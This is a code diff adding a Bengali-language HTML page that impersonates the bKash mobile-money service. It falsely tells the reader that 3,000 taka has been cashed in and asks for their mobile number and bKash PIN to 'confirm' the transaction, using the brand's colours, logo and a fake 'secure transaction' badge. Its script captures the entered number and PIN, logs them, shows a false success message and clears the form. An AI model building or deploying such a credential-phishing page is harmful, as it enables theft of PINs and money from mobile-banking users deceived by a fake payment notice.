@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bKash - লেনদেন কনফার্ম করুন</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            background-color: #f5f5f5;
+            color: #333; 
+            overflow: auto; 
+        }
+        .container { 
+            background: white; 
+            padding: 25px 20px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+            width: 100%; 
+            max-width: 350px; 
+            text-align: center; 
+            margin: 20px; 
+        }
+        .logo { 
+            width: 120px; 
+            margin-bottom: 15px; 
+        }
+        h2 { 
+            color: #e2136e; 
+            font-size: 22px; 
+            font-weight: 700; 
+            margin-bottom: 15px; 
+        }
+        .banner-message { 
+            background: #f8e5ee; 
+            color: #e2136e; 
+            padding: 12px; 
+            border-radius: 6px; 
+            font-size: 15px; 
+            margin-bottom: 20px; 
+            line-height: 1.4;
+            border-left: 4px solid #e2136e;
+            text-align: left;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #555;
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ddd; 
+            border-radius: 6px; 
+            font-size: 15px; 
+            outline: none; 
+            transition: border-color 0.3s; 
+        }
+        input:focus { 
+            border-color: #e2136e; 
+        }
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background: #e2136e; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 10px;
+            transition: opacity 0.3s;
+        }
+        button:hover { 
+            opacity: 0.9;
+        }
+        .security { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            margin: 20px 0; 
+            font-size: 13px; 
+            color: #666; 
+        }
+        .security::before { 
+            content: '🔒'; 
+            margin-right: 8px; 
+            font-size: 16px; 
+        }
+        .footer { 
+            font-size: 12px; 
+            color: #888; 
+            margin-top: 20px; 
+            line-height: 1.5; 
+        }
+        .footer a { 
+            color: #e2136e; 
+            text-decoration: none; 
+            font-weight: 500;
+        }
+        .amount-display {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e2136e;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/GQfxW9YC/Screenshot-2025-08-11-233108.png" alt="bKash Logo" class="logo">
+        <h2>টাকা পাঠান</h2>
+        
+        <div class="banner-message">
+            আপনার bKash অ্যাকাউন্টে <br>
+            <span class="amount-display">৩,০০০ টাকা</span><br>
+            ক্যাশ ইন হয়েছে। লেনদেনটি কনফার্ম করতে আপনার মোবাইল নম্বর এবং পিন প্রদান করুন।
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">মোবাইল নম্বর</label>
+                <input type="text" id="username" placeholder="01XXXXXXXXX" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">bKash PIN</label>
+                <input type="password" id="password" placeholder="৬ ডিজিটের PIN" required>
+            </div>
+            
+            <button type="submit">কনফার্ম করুন</button>
+        </form>
+        
+        <div class="security">সুরক্ষিত লেনদেন</div>
+        
+        <p class="footer">
+            bKash Limited © 2023<br>
+            <a href="#">গোপনীয়তা নীতি</a> | <a href="#">শর্তাবলী</a>
+        </p>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+            console.log('মোবাইল নম্বর:', username, 'পিন:', password);
+            alert('লেনদেন সফলভাবে সম্পন্ন হয়েছে! ধন্যবাদ।');
+            this.reset();
+        });
+    </script>
+</body>
+</html>
